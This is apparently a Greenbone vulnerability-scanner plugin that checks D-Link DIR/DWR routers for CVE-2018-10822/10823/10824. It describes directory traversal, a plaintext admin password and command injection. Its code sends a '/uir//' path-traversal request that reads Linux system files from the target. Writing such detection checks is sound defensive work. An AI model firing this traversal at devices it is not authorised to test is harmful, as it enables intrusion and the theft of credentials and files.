CPE_PREFIX = "cpe:/o:d-link";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108487" );
	script_version( "2021-05-26T06:00:13+0200" );
	script_cve_id( "CVE-2018-10822", "CVE-2018-10823", "CVE-2018-10824" );
	script_tag( name: "cvss_base", value: "9.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-05-26 06:00:13 +0200 (Wed, 26 May 2021)" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_tag( name: "creation_date", value: "2018-11-26 13:53:11 +0100 (Mon, 26 Nov 2018)" );
	script_name( "D-Link DIR/DWR Devices Multiple Vulnerabilities - Oct18" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dlink_dsl_detect.sc", "gb_dlink_dap_detect.sc", "gb_dlink_dir_detect.sc", "gb_dlink_dwr_detect.sc" );
	script_mandatory_keys( "Host/is_dlink_device" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10093" );
	script_xref( name: "URL", value: "http://sploit.tech/2018/10/12/D-Link.html" );
	script_xref( name: "URL", value: "https://seclists.org/fulldisclosure/2018/Oct/36" );
	script_tag( name: "summary", value: "The host is a D-Link (DIR/DWR) device which is
  prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request
  and check whether it is possible to read a file on the filesystem." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - a directory traversal vulnerability in the web interface (CVE-2018-10822) caused by an incorrect
  fix for CVE-2017-6190.

  - the administrative password stored in plaintext in the /tmp/XXX/0 file (CVE-2018-10824).

  - the possibility to injection code shell commands as an authenticated user into the Sip parameter
  of the chkisg.htm page (CVE-2018-10823)." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to read arbitrary files on the target system, extract plain text
  passwords or execute remote commands." );
	script_tag( name: "affected", value: "DWR-116 through 1.06,

  DIR-140L and DIR-640L through 1.02,

  DWR-512, DWR-712, DWR-912 and DWR-921 through 2.02,

  DWR-111 through 1.01.

  Other devices, models or versions might be also affected." );
	script_tag( name: "solution", value: "See the vendor advisory for a solution." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
files = traversal_files( "linux" );
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/uir//" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

